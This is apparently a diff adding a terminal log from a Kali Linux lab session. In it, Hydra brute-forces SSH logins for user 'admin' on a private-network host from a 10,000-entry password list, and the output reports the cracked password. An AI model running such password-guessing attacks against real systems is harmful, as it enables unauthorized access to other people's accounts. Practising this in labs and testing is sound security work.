@@ -1,0 +1,15 @@
+┌──(kali㉿kali)-[~]
+└─$ hydra -l admin -P pass.txt 192.168.68.126 ssh
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-12 12:42:33
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
+[DATA] attacking ssh://192.168.68.126:22/
+[STATUS] 291.00 tries/min, 291 tries in 00:01h, 9710 to do in 00:34h, 16 active
+[22][ssh] host: 192.168.68.126   login: admin   password: eclipse
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-12 12:44:30
